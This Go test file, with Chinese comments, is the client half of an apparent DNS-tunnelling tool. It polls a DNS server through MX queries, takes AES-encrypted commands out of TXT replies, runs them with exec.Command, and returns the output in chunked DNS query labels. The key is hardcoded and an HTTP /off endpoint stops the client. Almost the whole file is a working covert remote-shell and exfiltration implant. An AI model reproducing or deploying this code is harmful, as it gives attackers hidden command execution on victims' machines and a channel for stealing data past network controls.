package client

import (
	"encoding/json"
	"github.com/ice-ice/dnstunnel/aes"
	"github.com/ice-ice/dnstunnel/dns"
	log "github.com/ice-ice/dnstunnel/logger"
	"golang.org/x/text/encoding/simplifiedchinese"
	"io/ioutil"
	"math"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"testing"
	"time"
)

var (
	//normalDnsServer = "114.114.114.114:53" //正常的114dns服务器
	//normalHost      = "baidu.com."         //最后面这个.不能少

	DnsServerHost = "127.0.0.1:8053"   //dns服务端地址
	RootHost      = "baidu.com"        //根域名 例如baidu.com
	aesClientKey  = "1111111111111111" //加密钥匙 务必16位
	httpPortStr   = "8081"             //http 服务的端口号

	SendServerChan    = make(chan string, 300) //先进先出 队列
	ReadTimeout       int                      //连接读取超时时间 秒
	WriteTimeout      int                      //连接写超时时间 秒
	ClientCheckTicker *time.Ticker             //每5秒检查一次 服务端是否有命令需要执行
	ClientSendTicker  *time.Ticker             //读管道 每5秒向服务端发送一次回显数据
	logLevel          = log.INFO               //日志级别  ALL，DEBUG，INFO，WARN，ERROR，FATAL，OFF 级别由低到高
	OFF               = make(chan bool, 1)     //优雅退出 向该管道写入数据
)

//uint16 最大长度65535

//===== 基础协议 ====
//dns msg id = 6 开头时为检测服务端是否有指令需要执行 后3位为分组号例如6122

//===== shell 命令执行 =====
//dns msg id = 1 开头时为开始回传shell执行结果 后3位为分组号例如 1144 144为消息组号
//dns msg id = 3 开头时为正在回传  例如100313 后3位为分组号例如 3144 144为消息组号
//dns msg id = 5 开头时为回传shell执行结果已经完毕 后3位为分组号例如 5144 144为消息组号

func TestClient(t *testing.T) {
	//初始化log
	//指定是否控制台打印，默认为true
	log.SetConsole(true)
	log.SetLevel(logLevel)
	log.SetRollingDaily("", "test.log")
	log.Info("The process pid is " + strconv.Itoa(os.Getpid()))
	defer func() {
		log.Debug("recover main:")
		if err := recover(); err != nil {
			log.Info(err)
		}
	}()

	//开启http监听
	go func() {
		http.HandleFunc("/off", HttpOff)
		err := http.ListenAndServe(":"+httpPortStr, nil)
		if err != nil {
			log.Error("Http Server Error: ", err.Error())
		} else {
			log.Info("Http Server Success ", )
		}
	}()

	initApp()
	log.Info("started")

	//阻塞等待退出
	<-OFF
	log.Info("exit")
}

func HttpOff(w http.ResponseWriter, req *http.Request) {
	if req.Method == "POST" {
		body, err := ioutil.ReadAll(req.Body)
		if err != nil {
			log.Info("error - " + err.Error())
		}
		str := string(body)
		if str == aesClientKey {
			//退出
			OFF <- true
		}
	}
	w.Write([]byte("ok"))
}

func initApp() {

	//重置 Ticker
	if ClientSendTicker != nil {
		ClientSendTicker.Stop()
		ClientSendTicker = nil
	}

	if ClientCheckTicker != nil {
		ClientCheckTicker.Stop()
		ClientCheckTicker = nil
	}

	//清空回显管道
	SendServerChan = make(chan string, 1)

	ReadTimeout = 10
	WriteTimeout = 10
	if DnsServerHost == "" {
		panic("DnsServerHost is null")
	}
	if RootHost == "" {
		panic("RootHost is null")
	}
	if aesClientKey == "" {
		panic("AesKey is null")
	}
	if DnsServerHost == "" {
		panic("DnsServerHost is null")
	}
	if len(aesClientKey) != 16 {
		panic("AesKey Must be 16 character")
	}

	ClientCheckTicker = time.NewTicker(3 * time.Second)
	go func() {
		for _ = range ClientCheckTicker.C {
			checkServerShellCommond()
		}
	}()

	ClientSendTicker = time.NewTicker(5 * time.Second)
	go func() {
		for _ = range ClientSendTicker.C {
			body := <-SendServerChan
			log.Debug("sendBody=" + body)
			//开始分段传输给服务端
			sendDnsServerShellRetMsg(body)
		}
	}()

}

//消息分段 该处务必保持 63位以下，否则不符合dns协议
func msgSubsection(body string) []string {
	shengyuLen := 63 - len(RootHost) - 1 - 1 //减去两个点的长度 和 根域名的长度
	bodyLen := len(body)
	//消息分段回传
	msgArray := make([]string, 0)
	if bodyLen > shengyuLen {
		f := float64(bodyLen) / float64(shengyuLen)
		//需要分多少段 向上取整
		duanCeilInt := int(math.Ceil(f))
		rs := []rune(body)
		for i := 0; i < duanCeilInt; i++ {
			var meiduan string
			if (i + 1) == duanCeilInt {
				//最后一段了
				//最后一段直接不用分割 直接放入
				meiduan = string(rs[(shengyuLen-1)*i:])
			} else {
				//每段分割长度为dns name的剩余长度 shengyuLen
				//分割好后存入切片
				meiduan = string(rs[(shengyuLen-1)*i : (shengyuLen-1)*(i+1)])
			}
			msgArray = append(msgArray, meiduan)
		}

	} else {
		//无需分段
		msgArray = append(msgArray, body)
	}
	return msgArray
}

//回传shell消息 有消息分段逻辑
func sendDnsServerShellRetMsg(body string) {
	enStr, _ := aes.AesEncrypt([]byte(body), []byte(aesClientKey))
	msgArray := msgSubsection(enStr)
	groupid := RandInt64(1, 999)
	log.Debug("msgArray len=" + strconv.Itoa(len(msgArray)))
	//只有一段的
	if len(msgArray) == 1 {
		//发一段开始
		msgIdStr := "1" + strconv.Itoa(int(groupid))
		msgId, _ := strconv.Atoi(msgIdStr)
		sendDnsServerMsg(uint16(msgId), msgArray[0])
		time.Sleep(5 * time.Second)

		//发一段结束
		msgIdStr = "5" + strconv.Itoa(int(groupid))
		msgId, _ = strconv.Atoi(msgIdStr)
		//www占位
		sendDnsServerMsg(uint16(msgId), "www")
	} else {
		//多段
		for i, v := range msgArray {
			h := ""
			if i == 0 {
				//开始
				h = "1"
			} else if i == len(msgArray)-1 {
				//结束最后一段
				h = "5"
			} else {
				//中间阶段
				h = "3"
			}

			msgIdStr := h + strconv.Itoa(int(groupid))
			msgId, _ := strconv.Atoi(msgIdStr)
			sendDnsServerMsg(uint16(msgId), v)
		}
	}

}

//生成随机数
func RandInt64(min, max int64) int64 {
	if min >= max || min == 0 || max == 0 {
		return max
	}
	rand.Seed(time.Now().Unix())
	return rand.Int63n(max-min) + min
}

//检测服务端是否有待执行命令
func checkServerShellCommond() {
	//保持msgid 偶数
	groupid := RandInt64(1, 999)
	msgIdStr := "6" + strconv.Itoa(int(groupid))
	msgId, _ := strconv.Atoi(msgIdStr)

	ret := sendDnsServerMsg(uint16(msgId), "www")
	if ret == "" || ret == "1" {
		//无命令需要执行
		return
	}
	log.Debug("EXECUTE COMMAND->" + ret)
	str := ""
	cmd := exec.Command(ret)
	//创建获取命令输出管道
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		str = "Error:can not obtain stdout pipe for command:" + err.Error()
	}
	//执行命令
	if err := cmd.Start(); err != nil {
		str = "Error:The command is err," + err.Error()
	}
	//读取所有输出
	bytes, err := ioutil.ReadAll(stdout)
	if err != nil {
		str = "ReadAll Stdout:" + err.Error()
	}
	if err := cmd.Wait(); err != nil {
		str = "wait:" + err.Error()
	}

	go func() {
		//写入chan管道
		if str == "" {
			//没错误
			var decodeBytes, _ = simplifiedchinese.GB18030.NewDecoder().Bytes(bytes)
			log.Debug("write SendServerChan<-" + string(decodeBytes))
			SendServerChan <- string(decodeBytes)
		} else {
			//有错误
			log.Debug("write SendServerChan error<-" + ret)
			SendServerChan <- "is error," + ret
		}
	}()

}

//发送消息核心方法 内部不包含分包
//返回服务端响应的核心消息
func sendDnsServerMsg(msgId uint16, msgParagraph string) string {
	defer func() {
		log.Debug("recover sendDnsServerMsg:")
		if err := recover(); err != nil {
			log.Debug(err)
			//服务端挂掉 就清空池子
			SendServerChan = make(chan string, 300)
		}
	}()

	c := new(dns.Client)
	c.ReadTimeout = time.Duration(ReadTimeout) * time.Second
	c.WriteTimeout = time.Duration(WriteTimeout) * time.Second
	m := new(dns.Msg)
	m.SetQuestion(msgParagraph+"."+RootHost+".", dns.TypeMX)
	m.RecursionDesired = true
	m.MsgHdr.Id = msgId
	r, _, err := c.Exchange(m, DnsServerHost)
	if err != nil {
		log.Debug("test connect dns error->" + err.Error() + ",dns host->" + DnsServerHost)
	}

	bytes, _ := json.Marshal(r)
	if bytes == nil {
		log.Debug("test connect dns request bytes-> nil ,dns host->" + DnsServerHost)
	}
	log.Debug("dns host->" + DnsServerHost)
	log.Debug("request <-" + string(bytes))
	if r.Extra == nil || len(r.Extra) == 0 {
		log.Debug("request Extra<- nil")
	} else {
		array := strings.Split(r.Extra[0].String(), "TXT\t")
		if len(array) == 2 {
			//去掉首尾"
			str := array[1][1 : len(array[1])-1]
			//aes解密
			deStr, err := aes.AesDecrypt(str, []byte(aesClientKey))
			if err != nil {
				log.Info(err)
				return ""
			}
			return string(deStr)
		}
	}

	//以下为查看mx记录值
	//if r.Rcode != dns.RcodeSuccess {
	//	return ""
	//}
	//
	//for _, a := range r.Answer {
	//	if mx, ok := a.(*dns.MX); ok {
	//		log.Printf("request<-  %s\n", mx.String())
	//	}
	//}

	return ""
}
